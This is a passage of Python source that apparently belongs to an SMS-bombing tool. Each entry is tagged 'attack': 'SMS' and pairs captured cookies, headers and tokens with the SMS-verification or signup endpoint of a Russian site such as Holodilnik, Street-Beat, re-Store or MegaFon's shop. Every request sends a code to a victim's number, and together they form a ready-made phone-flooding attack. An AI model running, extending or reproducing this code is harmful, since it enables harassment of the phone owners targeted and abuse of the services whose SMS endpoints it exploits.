'eyJpdiI6Imp3QU82RDVSc0NEK3UveWxSL1oxdnc9PSIsInZhbHVlIjoidElUNXBJb2FqOHNDdzlidHVkc1NEd1BBY1hDVzdTVUJrQXUxNEI5bE5lOVpmOXNaZm1VRmVlRDZmVW5NcDdPL0FkakVHRUI5QW0zZnRaL0pzcnY3MUJxZGNvMXhZOERQVHVFcS9xenhLODEyTXBYSGRka2VET0o5WVlzeC9KbHEiLCJtYWMiOiIyZWMyMGE2YjgyMjc0MzdiZDg3NDE5YWY5NTBlMWUxMmM5YzJlNjJlYWEyODU1NjM3MjRjN2VjOTAzNTNkM2FkIiwidGFnIjoiIn0%3D', 'amp_e4f4e2': 'ZE4USAM1x1th0lC7UN8_VP...1h2ji6353.1h2ji6ckj.6.2.8', '_ga_7DC3P3DCCR': 'GS1.1.1686431272.2.0.1686431281.0.0.0',},
            'headers': {'authority': 'cdek.shopping', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json; charset=UTF-8', 'origin': 'https://cdek.shopping', 'referer': 'https://cdek.shopping/?utm_source=advcake&utm_medium=cpa&utm_campaign=epnbz&utm_content=4345726&advcake_params=42rw20xfseqbtpmcy1va3jx7u72me1f1&utm_term=42rw20xfseqbtpmcy1va3jx7u72me1f1', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'_token': '1ZYpFPTHdbS6OEBtG5xYcIdrulVDgTWjUkYH5uFm', 'phone': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Holodilnik.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.holodilnik.ru/ajax/user/get_tpl.php?29.54388002238084',
            'cookies': {'qrator_jsr': '1686431644.110.tIFuAS20cm9adImn-okdb7ap7sh90sm7oldqclc59fqe69q23-00', 'qrator_ssid': '1686431646.631.h3VUEpt8CsKuEm5C-vr15mjiu7prhrnu61tmg1i3t88a4l448', 'qrator_jsid': '1686431644.110.tIFuAS20cm9adImn-of5f4iolgfgp4d5opoctfdqpp8unlt0m', 'OrderUserType': '1', 'clean': '1', 'new_reg': '0', 'example_ab_test': '2', 'HRUSIDSHORT': '1b7ce4de8cc833fa345f7d877eafdca3', 'HRUSID': '85eca8a1f09ee12eed6440b49c57fb02', 'HRUSIDLONG': '99d7e9d0f564b1feff5cb44e41f8c74d', 'csrfnews': 'c4c34955461b5b852a562ba8f5a84893', 'ab_home': '08', 'clx_aid': '253174', 'clx_uid': 'self35191120', 'clx_date': '1686431648', 'clx_count': '1', 'utm_source': 'admitad', 'utm_medium': 'cpa', 'utm_campaign': '253174', '_utmx': '85eca8a1f09ee12eed6440b49c57fb02', 'action_blocks': '8815,8795,8713,8789', 'banners_rotations': '1227', 'wtb_sid': 'null', '_utmz': '06c26eef082aaffcb053e508c8bdb21efe372e07e3c459d8d6930a2527101745', '_ym_uid': '1686431642786899135', '_ym_d': '1686431642', '_ym_visorc': 'b', '_ga': 'GA1.2.900957556.1686431640', '_gid': 'GA1.2.1615381178.1686431644', '_ym_isad': '1', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', 'tmr_lvid': 'a027683ba986b1176f3b6e552f240434', 'tmr_lvidTS': '1686431648711', 'tmr_detect': '1%7C1686431649319', '_userGUID': '0:liqhv12e:IBAHyqCHzRz534ry~_d2XQV2iTaxtWu8', 'dSesn': '4463c1ed-65e5-21a4-de63-2888b5c5dfcd', '_dvs': '0:liqhv12e:fk23bdXw~zu3MeuZ~9vy66vc18K951Ss', 'advcake_track_id': 'edb60e37-b2e8-1a2e-f6be-9a27229f3514', 'advcake_session_id': 'fed4a3b5-df21-06b1-e18e-2674649f6aee', 'advcake_track_url': 'https%3A%2F%2Fwww.holodilnik.ru%2F%3Fadmitad_uid%3D03751c5d0e7e5e0c26e11bcdc187c72a%26utm_source%3Dadmitad%26utm_campaign%3D253174%26utm_medium%3Dcpa%26utm_content%3D03751c5d0e7e5e0c26e11bcdc187c72a%26utm_referrer%3Dhttp%253A%252F%252Fshare-bonus.qiwi.com%252F', 'advcake_utm_partner': '253174', 'advcake_utm_webmaster': '03751c5d0e7e5e0c26e11bcdc187c72a', 'advcake_click_id': '', 'mindboxDeviceUUID': '2e06635f-ee24-44c6-88d8-f6a688003fae', 'directCrm-session': '%7B%22deviceGuid%22%3A%222e06635f-ee24-44c6-88d8-f6a688003fae%22%7D', 'PHPSESSID': '66be79d97c9bd2043598d1d21fdeb516', '_ga_EHP29G0JCQ': 'GS1.1.1686431640.1.0.1686431697.0.0.0', 'page_hits': '2', 'clx_aid_last': '253174',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.holodilnik.ru', 'Referer': 'https://www.holodilnik.ru/?admitad_uid=03751c5d0e7e5e0c26e11bcdc187c72a&utm_source=admitad&utm_campaign=253174&utm_medium=cpa&utm_content=03751c5d0e7e5e0c26e11bcdc187c72a&utm_referrer=http%3A%2F%2Fshare-bonus.qiwi.com%2F', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'ajkey=00b865f72fb8d9b842dfa6ca79a938e4&ajform=LOGIN_FORM&ajaction=GET_CODE&ajphoneORemail=+{number}&ajverifycode=&ajUserType=1&ajConfPhone=&ajConfEmail=&ajPswd=&ajSubMode=',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Fstravel.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://fstravel.com/api/login/signup',
            'cookies': {'__ddg1_': 'CXPLLIVAJMr6CU5OwnaE', '_gcl_au': '1.1.1355684887.1686431693', '_gid': 'GA1.2.273804649.1686431694', '_tm_lt_sid': '1686431692679.335908', '_ym_uid': '1686431695962386493', '_ym_d': '1686431695', '_ym_visorc': 'b', 'mindboxDeviceUUID': '25b0d41d-f2d4-4447-b718-99a00a79d521', 'directCrm-session': '%7B%22deviceGuid%22%3A%2225b0d41d-f2d4-4447-b718-99a00a79d521%22%7D', '_ym_isad': '1', 'cted': 'modId%3Dop885zi2%3Bclient_id%3D213127934.1686431694%3Bya_client_id%3D1686431695962386493', 'tmr_lvid': '7580fd7fa77bc1a159cd633fcf29c82c', 'tmr_lvidTS': '1686431700583', 'advcake_track_id': '6e0eb5b5-9a1d-bdec-d30e-26a675a42315', 'advcake_session_id': '253d4fe1-bf9a-41ff-7992-7354861d2113', 'flocktory-uuid': '98dcfa9d-ee7b-40f2-9ecb-d68ade2e2f3f-9', '_ct_ids': 'op885zi2%3A42831%3A312590790', '_ct_session_id': '312590790', '_ct_site_id': '42831', 'call_s': '%3C!%3E%7B%22op885zi2%22%3A%5B1686433515%2C312590790%2C%7B%22241285%22%3A%22745570%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E', '_ct': '1700000000206277790', '_ct_client_global_id': 'adf2dde7-a6a9-5d3b-9090-3b8f57a65836', '_ga': 'GA1.2.213127934.1686431694', 'st_uid': 'f6ca0b86c8614cdef150871e0dafed6d', 'tmr_detect': '0%7C1686431710323', 'blueID': 'b6aa0957-6cec-4776-bfdb-444aabcbdd0b', 'uxs_uid': 'eadb0460-07d3-11ee-8dc9-c1d6376173a1', 'XSRF-TOKEN': 'eyJpdiI6IjZzZ3NEMnJqbkI4OHhJTEhLdjUzWkE9PSIsInZhbHVlIjoiSytBdzNGeWllOTUrT0N0ZFJ6TCtjMEN5ZGE2NXVKc2tsRzFuc3ovWHlLVFA0YW5SNnYvU1BsR0hNV3hoSmRrNEg5TlJRcWsrM1U5U2NPSEdmcnM1OTFKanlFaXZEWDJ4RDhobXk5cE9yVFIraU9BQk83bXZGZVYzeGVpaFpNS2MiLCJtYWMiOiJjYjk2NzEwZDhlMmI4YWZlZjgzNWNmODMwZjhkNmRhM2M5NjQ2NTEwZjY4Y2ZlOGQwOWQ4NjY5YWFiM2E0YWJiIn0%3D', 'funsan_session': 'eyJpdiI6IjgrejVUelRGU3FMcUJRUVBrWExLd3c9PSIsInZhbHVlIjoiNmxRN3pkQzZSNnN6WlBlSTFaMDlBVEF3SmZMWTZHSC9aMTNNQW54SG81SnMrYXZ5M3hqVG1vVml1MlNyNG9jZzJIVHM0MGpGWXdhRlFQUm5NK1JjdC9rQThXYkE5YWg4eDh1Um9wamo2Qk9wZlVpdGJGQWVFOXhtcDY3MUUrTEEiLCJtYWMiOiI5ZGM3M2UyN2E3YzJjMTZmYTIwYWUwMDM3YTYyYTU4YTY3ZTkyOTBhYmUwNTE4Y2JiYzg3NTY4M2EzNjk5ZGQ3In0%3D', '_gat_UA-12089726-23': '1', '_ga_GJ17DPCPJY': 'GS1.1.1686431700.1.1.1686432158.0.0.0',},
            'headers': {'authority': 'fstravel.com', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://fstravel.com', 'referer': 'https://fstravel.com/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-xsrf-token': 'eyJpdiI6IjZzZ3NEMnJqbkI4OHhJTEhLdjUzWkE9PSIsInZhbHVlIjoiSytBdzNGeWllOTUrT0N0ZFJ6TCtjMEN5ZGE2NXVKc2tsRzFuc3ovWHlLVFA0YW5SNnYvU1BsR0hNV3hoSmRrNEg5TlJRcWsrM1U5U2NPSEdmcnM1OTFKanlFaXZEWDJ4RDhobXk5cE9yVFIraU9BQk83bXZGZVYzeGVpaFpNS2MiLCJtYWMiOiJjYjk2NzEwZDhlMmI4YWZlZjgzNWNmODMwZjhkNmRhM2M5NjQ2NTEwZjY4Y2ZlOGQwOWQ4NjY5YWFiM2E0YWJiIn0=',},
            'json': {'email': email(), 'phone': f'+{number}', 'password': 'sfghsfghgfhfgd', 'role': 'customer', 'emailing': True, 'agreement': True, 'termsConfirm': True,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Street-Beat.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://street-beat.ru/local/components/multisite/system.auth.sms/ajax.php',
            'cookies': {'PHPSESSID': '5shNJzzDdPbbJKds6srfQNICF1jGZR1B', 'BITRIX_SM_DISABLE_APP_ICONS': 'Y', 'rerf': 'AAAAAGSE7kerGJpNBNvtAg==', 'ipp_uid': '1686433351334/c4gmQpX2TRrYFqYX/AvnurTjGH726dXaMYZQeEw==', 'ipp_key': 'v1686433351334/v33947245ba5adc7a72e273/Wr4gl5jMzt4XsYQTt8lb8Q==', '_gid': 'GA1.2.463452106.1686433346', '_ym_uid': '1686433346906986851', '_ym_d': '1686433346', '_ym_visorc': 'w', '__zzatinv-w-strbeat': 'MDA0dBA=Fz2+aQ==', 'tmr_lvid': 'c243f85275dbe5e0ebe700dbf992fb90', 'tmr_lvidTS': '1686433348158', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ga': 'GA1.2.2073063428.1686433346', '_ga_E3GN5VV3T0': 'GS1.1.1686433348.1.0.1686433353.55.0.0', 'adspire_uid': 'AS.1560125001.1686433353', 'atm_closer': '%7B%22id%22%3A12649%2C%22mid%22%3A18392%2C%22aid%22%3A%22AS.1560125001.1686433353%22%2C%22cookie_time%22%3A1686433353228%2C%22priority%22%3A0%2C%22webid%22%3A%22253174%22%2C%22uid%22%3A%22332e34ce81184a1ae541448af95f8f50%22%7D', 'user_city': '%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0', 'BX_USER_ID': 'de13beb149d9d644f2162023024c0733', '_ym_isad': '1', 'mindboxDeviceUUID': '03165e0b-c2ae-4e44-a119-5c5e6ade6dc4', 'directCrm-session': '%7B%22deviceGuid%22%3A%2203165e0b-c2ae-4e44-a119-5c5e6ade6dc4%22%7D', 'tmr_detect': '0%7C1686433359011', 'cfidsinv-w-strbeat': 'sq6igjExcMeSQ32XDWH7ay+9EXTZTzQ7jwTUDvFDHTis26so842bk+nY6flj7ak4yWFYKWeSoIROW+Xnic/l2ngnu3Nu1hO3GWOpYYX4cYkoThr2a9W6zrYJ0OKwFI/akqn+z2aWif4wOI4/QcpDRFmvnwmwvgGVpDGU', 'cfidsinv-w-strbeat': 'sq6igjExcMeSQ32XDWH7ay+9EXTZTzQ7jwTUDvFDHTis26so842bk+nY6flj7ak4yWFYKWeSoIROW+Xnic/l2ngnu3Nu1hO3GWOpYYX4cYkoThr2a9W6zrYJ0OKwFI/akqn+z2aWif4wOI4/QcpDRFmvnwmwvgGVpDGU', 'gsscinv-w-strbeat': 'TWecOu6YXKjYQrP/glY+ZUC2ULlW6mrF6ZxVst7MgSwDTO28E93kxf+RiM5ehecH4qDBWalMtDTaD7rQZkDqg9jxN8RilDc1sqIgKgCZ9YPwbrAZxxbfFuS171rhCyzSzLyXSZi8BnkZEm2BSRCOqwkYc3P2PwLFKU+Ztn3Gpkb5VDflhJa2/Jcjz9tpK/svkfV4BgLpEAtFw4toYNiZt5aPWjB4OOyYpEDqbLqAahOinCwtV5GdaygoJQBL6Q==', 'fgsscinv-w-strbeat': 'KIHBe1b693019b5af3b6fd0edb06d3f54123ff2f',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://street-beat.ru', 'Referer': 'https://street-beat.ru/?admitad_uid=332e34ce81184a1ae541448af95f8f50&utm_campaign=253174&utm_content=closer&utm_medium=cpa&utm_source=admitad', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'action': 'code_sms', 'PERSONAL_PHONE': f'+{number}', 'PERSONAL_EMAIL': '',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'BudZdorov.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.budzdorov.ru/rest/V1/mindbox/account/generateSMS',
            'cookies': {'mindboxDeviceUUID': '8b5af471-95a8-42b0-aa9f-ad37125cf667', 'directCrm-session': '%7B%22deviceGuid%22%3A%228b5af471-95a8-42b0-aa9f-ad37125cf667%22%7D', 'gtm_url_params': '{"utm_source":"admitad","utm_medium":"cpa","utm_campaign":"253174","utm_term":"|UIDjpVlMY","tagtag_uid":"f807432083704f4d47215a5877bb0c9c"}', 'gtm_source': 'admitad', 'gtm_medium': 'cpa', '_gid': 'GA1.2.1238216767.1686433343', 'tmr_lvid': '67f94a2b8161e3732383d8f902b7d1b3', 'tmr_lvidTS': '1686433342733', 'RIGLA_WEB_SESSION_GUID': '20654ec6-d019-4849-93b1-5022843aba8c', 'regionSuggested': '2', 'tmr_detect': '1%7C1686433343057', '_ym_uid': '1686433343127791196', '_ym_d': '1686433343', '_ym_isad': '1', '_ym_visorc': 'b', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', 'quoteId': '4c41b09666a7d84d08f4bbe9ba53cbbe', 'private_content_version': '45f572a287c328b10b24a85f18d52af6', '_gcl_au': '1.1.877053724.1686433344', '_ga_9SJR75L9RQ': 'GS1.1.1686433344.1.1.1686433349.55.0.0', 'st_uid': 'fdd13560b25126b49bd0e9804b57dba7', 'tagtag_aid': 'f807432083704f4d47215a5877bb0c9c', 'tagtag_aid': 'f807432083704f4d47215a5877bb0c9c', 'tagtag_aid': 'f807432083704f4d47215a5877bb0c9c', 'tt_deduplication_cookie': 'adm', 'tt_deduplication_cookie': 'adm', 'tt_deduplication_cookie': 'adm', '_ga_ETTH8D938B': 'GS1.1.1686433358.1.0.1686433358.0.0.0', '_ga': 'GA1.1.1312642077.1686433343',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Authorization': 'Bearer istj5q47csroxde8kge4uqole7ndy3ox', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://www.budzdorov.ru', 'Referer': 'https://www.budzdorov.ru/?utm_source=admitad&utm_medium=cpa&utm_campaign=253174&utm_term=%7CUIDjpVlMY&tagtag_uid=f807432083704f4d47215a5877bb0c9c', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-APP': 'WEB', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'telephone': number, 'recaptcha': '03AL8dmw8K85fRhJw6YRvqdbWlluPFtElzyCgUrk1pvtyp3nHDv4xV7wsS9jcVjZnRCmR-YPixcpx7KieIqDOzeOb5cETbpQwpoCO9jns8IU1Lx2jTLXhP_QQ1eUfphL5GMZe5rcmnKdXJ7gWOW3CN54yfPqs1067I6xIRdK7v-RL896sCGRo9V6Od9HcMahfvQxFnnIuPZw3Mb8qxX-0OAeUn4H2VRkOAk9llogU4DweQScWMRB8dULxczzE73GwzhDARa-zUdzWTZtOgjwAj-eyMpvv_mBtYDskP89IsYTL5fKa7p000fXYUg8itvmIEBURuneFEDPvW8JlBZ1xp2hm-gMF1U-8mOSE7dp9IEIvmQFqiX88Yc10hP8AkLQM8fHfNxiXng_pJOgbnkuyKk_9Uyo0dtxTHkfan9i6ghwmGRjuR8vUc3giYPTeaOgsX1WdPGyzYdXyKcFMea00GVH81k-41pQu87FfwuIHcgaMl7bHqWt6Iyt3zAKE1sDcxQK8mZRaBeJKTArHA8m3T4mPQCIGbLnWMXQ',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 're-Store.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': f'https://re-store.ru/api/auth/code/phone/?phone=+{number}&_csrf_token=53871ac9989cddc884b16.NJjrU8LDfFFQgQn2Xg_fFP-ePeYzzlArWsG3o7KxhqM.XsmJYYuEFjcb9F6_MUfuWbizT6JrrQgGC6rOkdDw1MkH4ZoJhIguZBbeSA',
            'cookies': {'PHPSESSID': '3jd3VX00D82wF1vS5pkstylQwcPtK2zm', 'BITRIX_SM_SALE_UID': '1706027658', 'rerf': 'AAAAAGSE876+gzV9AzOfAg==', 'ipp_uid': '1686434749957/jBP7P6SUXRaS67Ym/9K6kMiCf2f+XEtC3km9UmQ==', 'ipp_key': 'v1686434749957/v33947245ba5adc7a72e273/wGHChlcrXlxQ3sFHCiT2lA==', 'flomni_630671829fa868097f1947da': '{%22userHash%22:%229e2fb053-cc98-4541-b47d-56e471b647c9%22}', 'adspire_uid': 'AS.318886711.1686434751', 'atm_closer': '%7B%22id%22%3A273%2C%22mid%22%3A9276%2C%22aid%22%3A%22AS.318886711.1686434751%22%2C%22cookie_time%22%3A1686434751410%2C%22priority%22%3A0%2C%22webid%22%3A%22253174%22%2C%22uid%22%3A%2282c5cf8cd6f16e5e8df1cbc48a3afd33%22%7D', '_gid': 'GA1.2.1854735506.1686434771', 'adriver_session': '1', '_ym_uid': '1686434771141838163', '_ym_d': '1686434771', '_ym_visorc': 'b', 'tmr_lvid': 'fedd865bf61a39d4fc5f92916def5bab', 'tmr_lvidTS': '1686434772900', 'tmr_detect': '1%7C1686434773319', '_ym_isad': '1', '_ga_WX7VG3P9BH': 'GS1.1.1686434776.1.0.1686434776.60.0.0', '_ga': 'GA1.2.204207028.1686434771', 'flocktory-uuid': '40dc8694-63bd-4266-8fe3-d1a0ee66823d-8', '_gpVisits': '{"isFirstVisitDomain":true,"idContainer":"10002521"}', 'BX_USER_ID': '8ad9c449351082b05367f5bda72b5d59', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_gp10002521': '{"utm":"7072a802","hits":1,"vc":1,"ac":1}', 'mindboxDeviceUUID': '53b63c99-5942-4567-8b4a-837c43bde2f2', 'directCrm-session': '%7B%22deviceGuid%22%3A%2253b63c99-5942-4567-8b4a-837c43bde2f2%22%7D', '_ru_yandex_autofill': 'long_time_no_see',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Origin': 'https://re-store.ru', 'Referer': 'https://re-store.ru/?uid=82c5cf8cd6f16e5e8df1cbc48a3afd33&utm_campaign=253174&utm_content=closer&utm_medium=cpa&utm_source=cpamit', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Moscow.Shop.MegaFon.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://moscow.shop.megafon.ru/personal/registration/check',
            'cookies': {'reg_pref': 'moscow', 'homeRegion': 'moscow', 'SHOPSESSID': '6jm4vei6fbhq7ivu32plp1odmj', '_ejwt': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJtZnItZXNob3AiLCJhdWQiOiJiMmMiLCJpYXQiOjE2ODY0MzU0NDgsImV4cCI6MTY4NzY0NTA0OCwianRpIjoiZW1wbG95ZWUiLCJwZCI6eyJyZXNlcnZlRW5hYmxlIjpmYWxzZSwibm9FbXBsb3llZSI6ZmFsc2UsInR5cGVJZCI6bnVsbCwicGVyc29ubmVsTnVtYmVyIjpudWxsLCJyZWdpb24iOm51bGwsInNhbG9uQ29kZSI6bnVsbH19.EiQEkXOkepIRv_TS70DZU3jNpLZJc4qviAcnW4Z4oJNMwK_OEldSs79YIVHHGC8Zzg5J6SGHVHDIlUO6JBM6Y-ZiZ1-2dmLiS2lrMF4DgU84mIIhtTc4S0nr2CioXZig8Q45NXGuE3sH_-rDaUWAxdTx6lRuHS5KpuKDlrgKuw38wG7DEC3zRcrFH2GpsUS3upKgwXAj8Pq7XEMX8Y80QWseflrnWFTby0YxAvVKVF32PkabU7Sn-v42FJhRWb7AlHOmxiVm4Xo-FKHBRjw3gIzg0kdfgkG7iQAdhZKjW31ezz3e1POnz6zyfSdK1lcQnGMHz6jCwmcGzgw4EkVTRw', 'admitad_uid': '9e9d6d81aa2c5857ae1fde8a853f284b', '_ajwt': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJtZnItZXNob3AiLCJhdWQiOiJiMmMiLCJpYXQiOjE2ODY0MzU0NDcsImV4cCI6MTY4NzY0NTA0NywianRpIjoiY3VzdG9tZXIiLCJwZCI6eyJhdXRoU3RhdHVzIjowLCJhdXRoVGltZSI6bnVsbCwiY2xpZW50SWQiOjAsImVtYWlsIjoiIiwibXNpc2RuIjoiIiwicGVyc29uYWxEYXRhIjp7ImZpcnN0TmFtZSI6Ilx1MDQyM1x1MDQzMlx1MDQzMFx1MDQzNlx1MDQzMFx1MDQzNVx1MDQzY1x1MDQ0Ylx1MDQzOSIsImxhc3ROYW1lIjoiXHUwNDNmXHUwNDNlXHUwNDNhXHUwNDQzXHUwNDNmXHUwNDMwXHUwNDQyXHUwNDM1XHUwNDNiXHUwNDRjIiwibWlkZGxlTmFtZSI6bnVsbH0sInJ0aW1BdXRoIjpudWxsLCJ1aWQiOjg5MzIwOTY3MX19.RZzsunqtBddAA8pF9DKaKdXU6ni8DgAe9jAJOFOw63XvqzvJi8KAjoJjA6_4V-gTGOf43z6ccZgv0NesCkPXMZGwMltMCM_KcLvMgWukc-yI5MfnfaSf3NWpLdQOHbZP6rWcohdjkrbz_3HCwhGlstitqs58LS41T7gklQz5dn3VIXQoqJp2a3HdfodWhSmN4FmK5OFvb47hUCnsiR7h7hU9mTrygksmwXHo5AljB3GNzli1fKJD2UPIWav_cCh4rQUn6Fq_bYytjjEnak_pDdtV3Anm9sCxb5aNjo5i8UM3h9i6tt-20vriRc4PzzZFANGrEisI9jWhxH3rgAEY1Q', 'uid3': '893209671', 'uid3ttl': '71e9770df0a2ff77fd64d9f4b13a148a', 'st_uid': '1b07a2fbca402fa60fbf9c27eaf9eb0a', 'SERVERBINARIESID': 'webcl-bin-01', '_ym_uid': '1686435420355133792', '_ym_d': '1686435420', 'tmr_lvid': '8489add121e0fb54b02b73505ea954e0', 'tmr_lvidTS': '1686435420308', '_gcl_au': '1.1.768483979.1686435421', 'gtm_cpa_shop_zakaz': 'admitad|9e9d6d81aa2c5857ae1fde8a853f284b', 'gtm_rand_shop': '1409903029', 'tmr_detect': '1%7C1686435421317', 'flocktory-uuid': '3821c2bc-1135-414c-bf89-094156548a02-4', '_ym_isad': '1', '_ga': 'GA1.2.1693167921.1686435424', '_gid': 'GA1.2.1307757676.1686435424', '_dc_gtm_UA-47701048-1': '1', '_dc_gtm_UA-18264094-54': '1', '_dc_gtm_UA-18264094-76': '1', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ym_visorc': 'w', 'mindboxDeviceUUID': '12771081-699f-4afe-99df-316bb1566327', 'directCrm-session': '%7B%22deviceGuid%22%3A%2212771081-699f-4afe-99df-316bb1566327%22%7D', 'SERVERID': 'webcl-waf-02',},
            'headers': {'authority': 'moscow.shop.megafon.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://moscow.shop.megafon.ru', 'referer': 'https://moscow.shop.megafon.ru/?utm_source=admitad&utm_medium=ag-perfo_partner_253174_banner_cpa&utm_campaign=fed_flat_shop&admitad_uid=9e9d6d81aa2c5857ae1fde8a853f284b', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'fullName': 'User Names Name', 'msisdn': number, 'email': email(), 'subscribe': True,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Akusherstvo.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.akusherstvo.ru/ajax/user_auth/registration_sms_send.php',
            'cookies': {'__ddg1_': 'Ui9YQyrpuqvn1IoiDs1M', 'ab_fast_search': 'diginetica', 'ab_main_menu_v3': 'b50', 'PHPSESS': 'a0b1ef65d0bbf188ef8156b3dcf7cf0e', 'mobile_version': '0', 'uui': '9cffcca3d0558470edf5d3914332b983', 'location': '%7B%22ip%22%3A%22no%22%2C%22cityid%22%3A%2277000000000%22%2C%22regid%22%3A%2277000000000%22%2C%22cityname%22%3A%22%25D0%259C%25D0%25BE%25D1%2581%25D0%25BA%25D0%25B2%25D0%25B0%22%7D', 'widget_type_test2017_v2': '1', 'ab_msk_deliv_t': 'old', 'found_cheaper_ab': '1', 'httpCacheDetector': 'true', '_ym_uid': '1686429100536293125', '_ym_d': '1686429100', 'abasket': '2023-06-10', '_ym_isad': '1', '5sayer.sid': 'kbrBwdkmvh_DjipyzpUJI8unIe3wxybMO6yTG_UM', '_gid': 'GA1.2.122667064.1686429101', '_gcl_au': '1.1.191981467.1686429101', 'tmr_lvid': '9925981245ad65ffb520f718da9260e4', 'tmr_lvidTS': '1686429100592', '_ym_visorc': 'w', 'webpush_serviceworker_time': '1686429103', 'webpush_domen': 'akusherstvo.ru', 'webpush_endpoint': 'empty', 'JivoSiteLoaded': '1', 'mindboxDeviceUUID': '9b86270a-08d6-43ff-836b-a71dd498ec4f', 'directCrm-session': '%7B%22deviceGuid%22%3A%229b86270a-08d6-43ff-836b-a71dd498ec4f%22%7D', '_userGUID': '0:liqgcz2v:cE_N_h4_X2UHTzbn9tLIKDLbzslRxFvY', 'dSesn': '8f44505a-ace7-2ac8-9b7d-cc44e289e0ef', '_dvs': '0:liqgcz2v:cWbNSW6_ae9M~uuzAUGdCp0KLGV1~0CJ', 'fmcfa': '1', '_gat': '1', '_ga': 'GA1.1.79302589.1686429101', '_ga_YHGF93G3Y4': 